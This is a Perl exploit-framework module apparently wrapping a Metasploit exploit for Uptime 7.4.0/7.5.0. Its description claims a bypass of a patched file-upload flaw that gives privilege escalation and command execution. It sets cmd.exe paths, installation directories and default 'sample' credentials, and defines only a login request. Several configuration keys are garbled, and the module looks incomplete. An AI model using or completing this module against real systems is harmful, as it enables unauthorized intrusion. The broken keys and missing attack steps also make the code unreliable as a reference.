package UPTIME::MSF::UptimeFileUpload_2;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "UptimeFileUpload_2";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION"                      => "

        This module exploits a vulnerability found in Uptime version 7.4.0 and 7.5.0.



        The vulnerability began as a classic arbitrary file upload vulnerability in post2file.php,

        which can be exploited by exploits/multi/http/uptime_file_upload_1.rb, but it was mitigated

        by the vendor.



        Although the mitigation in place will prevent uptime_file_upload_1.rb from working, it

        can still be bypassed and gain privilege escalation, and allows the attacker to upload file

        again, and execute arbitrary commands.

      ",
  "DISABLEEDITOFUSERTITLEROLEGROUP"  => "false",
  "ERDCTITLE"                        => "Exploit",
  "LABEL_[184]"                      => "Script Name",
  "MSF_MODULE"                       => "uptime_file_upload_2",
  "PATHS"                            => [":\\\\windows\\\\system32\\\\cmd.exe"],
  "REFERENCES"                       => [
                                          "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5254.php",
                                        ],
  "THE USERTITLE TO AUTHENTICATE AS" => "sample",
  "TITLE"                            => "Exploit",
  "TITLE_[ARGS]"                     => 185,
  "TITLE_[OUTPUT]"                   => 187,
  "TITLE_[PROCESS]"                  => 184,
  "TITLE_[TIMER]"                    => 189,
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "Path to cmd.exe",
  VALUE => "c:\\\\windows\\\\system32\\\\cmd.exe",
},
    'UPTIMEWINDOWSDIRECTORY' =>       {
  DESCRIPTION => "Uptime installation path for Windows",
  VALUE => "C:\\\\Program Files\\\\uptime software\\\\",
},
    'UPTIMELINUXDIRECTORY' =>       {
  DESCRIPTION => "Uptime installation path for Linux",
  VALUE => "/usr/local/uptime/",
},
    'PASSWORD' =>       {
  DESCRIPTION => "The password to authenticate with",
  VALUE => "sample",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'index.php',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /index.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
